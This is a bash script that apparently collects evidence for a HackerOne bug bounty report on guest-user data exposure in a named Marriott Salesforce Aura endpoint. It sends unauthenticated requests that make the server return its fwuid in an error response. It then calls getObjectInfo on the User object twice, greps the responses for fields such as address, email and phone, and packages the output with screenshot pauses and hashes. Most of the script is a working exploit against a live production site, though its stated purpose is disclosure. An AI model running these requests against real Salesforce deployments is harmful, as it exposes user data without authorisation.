#!/usr/bin/env bash
# M002 Evidence Collection — HackerOne #3817499
# Salesforce Aura Guest User Object Exposure
# cpp.marriott.com/s/sfsites/aura
# 62-col mobile-safe, 4 screenshot pauses, 2x reproducibility

export NO_COLOR=1 CLICOLOR=0 BAT_PAGER=cat PAGER=cat BAT_STYLE=plain

TARGET='https://cpp.marriott.com/s/sfsites/aura'
EDIR=~/m002-evidence-$(date -u +%Y%m%d-%H%M%S)
mkdir -p "$EDIR"

LN()  { printf '─%.0s' {1..62}; printf '\n'; }
DLN() { printf '═%.0s' {1..62}; printf '\n'; }
PAUSE() {
  printf '\n'; LN
  printf '  ★  SCREENSHOT %s — take screenshot now\n' "$1"
  LN
  printf '  Press ENTER to continue... '; read -r _; printf '\n'
}

# ── PHASE 1: extract fwuid + collect all data ────────────────
printf 'Step 1: Extracting fwuid from server...\n'
MYIP=$(curl -s --max-time 10 ifconfig.me)
TS1=$(date -u '+%Y-%m-%d %H:%M:%S UTC')

FWUID=$(curl -s -X POST "$TARGET" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'message={"actions":[]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"invalid","app":"siteforce:communityApp","dn":[],"globals":{},"uad":false}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  -o "$EDIR/fwuid-response.txt" \
  && grep -oP '"fwuid":"[^"]+' "$EDIR/fwuid-response.txt" \
  | head -1 | cut -d'"' -f4)

if [ -z "$FWUID" ]; then
  printf 'ERROR: fwuid extraction failed. Check network.\n'
  exit 1
fi
printf 'fwuid: %s\n' "$FWUID"

printf 'Step 2: Running bypass (run 1)...\n'
TS2=$(date -u '+%Y-%m-%d %H:%M:%S UTC')
curl -v -s -X POST "$TARGET" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'message={"actions":[{"id":"1","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"$FWUID\",\"app\":\"siteforce:communityApp\",\"dn\":[],\"globals\":{},\"uad\":false}" \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  -o "$EDIR/bypass-body-r1.txt" 2>"$EDIR/bypass-verbose-r1.txt"

printf 'Step 3: Running bypass (run 2)...\n'
TS3=$(date -u '+%Y-%m-%d %H:%M:%S UTC')
curl -s -X POST "$TARGET" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'message={"actions":[{"id":"1","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"$FWUID\",\"app\":\"siteforce:communityApp\",\"dn\":[],\"globals\":{},\"uad\":false}" \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  -o "$EDIR/bypass-body-r2.txt" 2>/dev/null

# Save truncated response for attachment (first 500 lines)
head -c 50000 "$EDIR/bypass-body-r1.txt" > "$EDIR/bypass-body-truncated.txt"

STATE_R1=$(grep -oP '"state":"[^"]+' "$EDIR/bypass-body-r1.txt" \
  | head -1 | sed 's/"state":"//')
STATE_R2=$(grep -oP '"state":"[^"]+' "$EDIR/bypass-body-r2.txt" \
  | head -1 | sed 's/"state":"//')
SIZE_R1=$(wc -c < "$EDIR/bypass-body-r1.txt")
SIZE_R2=$(wc -c < "$EDIR/bypass-body-r2.txt")
FIELDS=$(grep -oP '"name":"[^"]+' "$EDIR/bypass-body-r1.txt" | wc -l)
SIZE_MB=$(awk "BEGIN {printf \"%.1f\", $SIZE_R1/1048576}")
printf 'Done. State=%s Size=%dB Fields=%d\n\n' \
  "$STATE_R1" "$SIZE_R1" "$FIELDS"

# ── SECTION A: Metadata + fwuid extraction ───────────────────
{
DLN
printf '  SECTION A/4 -- METADATA + FWUID EXTRACTION\n'
DLN
printf '  Date/Time  : %s\n' "$TS1"
printf '  Source IP  : %s\n' "$MYIP"
printf '  Tool       : curl 8.20.0 aarch64-linux-android\n'
printf '  Platform   : aarch64 Linux/Termux (Pi 5)\n'
printf '  Target     : cpp.marriott.com/s/sfsites/aura\n'
printf '  Report     : HackerOne #3817499\n'
DLN
printf '\n  fwuid extracted via unauthenticated probe:\n\n'
printf '  POST /s/sfsites/aura\n'
printf '  aura.context.fwuid = "invalid"\n'
printf '  aura.token = undefined\n'
printf '  >> Server returns correct fwuid in error response\n\n'
printf '  fwuid: %s\n' "$FWUID"
printf '\n  (No authentication required to extract fwuid)\n'
DLN
} | tee "$EDIR/section-A.txt"
PAUSE "A/4 (metadata + fwuid)"

# ── SECTION B: Bypass request headers ────────────────────────
{
DLN
printf '  SECTION B/4 -- BYPASS REQUEST (unauthenticated)\n'
DLN
printf '  Descriptor : aura://RecordUiController\n'
printf '               /ACTION$getObjectInfo\n'
printf '  Object     : User\n'
printf '  Token      : undefined (no auth)\n\n'
printf '  >> Headers sent to server:\n'
grep '^> ' "$EDIR/bypass-verbose-r1.txt" | grep -v '^> $' \
  | sed 's/^> /    /'
printf '\n'
printf '  +--------------------------------------------+\n'
printf '  | aura.token=undefined -- no authentication  |\n'
printf '  | No Cookie or Authorization header sent     |\n'
printf '  +--------------------------------------------+\n'
printf '\n  << Response headers:\n'
grep '^< ' "$EDIR/bypass-verbose-r1.txt" \
  | sed 's/^< //' \
  | grep -iE '^(HTTP|content-length|content-type|server)' \
  | sed 's/^/    /'
DLN
} | tee "$EDIR/section-B.txt"
PAUSE "B/4 (request headers -- no auth)"

# ── SECTION C: Response + field analysis ─────────────────────
{
DLN
printf '  SECTION C/4 -- RESPONSE ANALYSIS\n'
DLN
printf '\n  Run 1: %s\n' "$TS2"
printf '  State  : %s\n' "$STATE_R1"
printf '  Size   : %d bytes (%s MB)\n' "$SIZE_R1" "$SIZE_MB"
printf '  Fields : %d User object definitions\n' "$FIELDS"
printf '\n  Run 2: %s\n' "$TS3"
printf '  State  : %s\n' "$STATE_R2"
printf '  Size   : %d bytes\n' "$SIZE_R2"
printf '\n  Sample sensitive fields in response:\n'
grep -oP '"label":"[^"]+' "$EDIR/bypass-body-r1.txt" \
  | sed 's/"label":"//' | sort -u \
  | grep -iE '(address|city|country|company|alias|nickname|photo|phone|email|mobile|name|about)' \
  | head -15 | sed 's/^/    /'
DLN
} | tee "$EDIR/section-C.txt"
PAUSE "C/4 (state:SUCCESS + field count)"

# ── SECTION D: Verdict ───────────────────────────────────────
{
DLN
printf '  SECTION D/4 -- VERDICT\n'
DLN
printf '\n  *** GUEST USER EXPOSURE CONFIRMED ***\n\n'
printf '  Target   : cpp.marriott.com/s/sfsites/aura\n'
printf '  Auth     : aura.token=undefined\n'
printf '  Object   : Salesforce User\n'
printf '  State    : %s\n' "$STATE_R1"
printf '  Fields   : %d definitions exposed\n' "$FIELDS"
printf '  Size     : %s MB (%d bytes)\n' "$SIZE_MB" "$SIZE_R1"
printf '  Includes : Address, City, Country, Company,\n'
printf '             Alias, Nickname, Photos, and %d more\n' \
  "$((FIELDS - 10))"
printf '\n  Reproduced twice -- same result both runs.\n'
printf '\n  Run 1 : %s\n' "$TS2"
printf '  Run 2 : %s\n' "$TS3"
printf '  IP    : %s\n' "$MYIP"
DLN
} | tee "$EDIR/section-D.txt"
PAUSE "D/4 (verdict -- final)"

# ── Evidence bundle ──────────────────────────────────────────
{
DLN
printf '  EVIDENCE BUNDLE\n'
DLN
ls -lh "$EDIR/" | awk 'NR>1 {printf "  %s\n", $0}'
DLN
} | tee "$EDIR/evidence-summary.txt"

(cd "$EDIR" && sha256sum \
  bypass-body-r1.txt bypass-verbose-r1.txt \
  bypass-body-r2.txt bypass-body-truncated.txt \
  2>/dev/null || shasum -a 256 \
  bypass-body-r1.txt bypass-verbose-r1.txt \
  bypass-body-r2.txt bypass-body-truncated.txt) \
  > "$EDIR/SHA256SUMS.txt"

B=$(basename "$EDIR")
printf 'SHA256SUMS.txt saved.\n'
printf 'Re-display sections:\n'
printf '  command cat ~/%s/section-A.txt\n' "$B"
printf '  command cat ~/%s/section-B.txt\n' "$B"
printf '  command cat ~/%s/section-C.txt\n' "$B"
printf '  command cat ~/%s/section-D.txt\n' "$B"
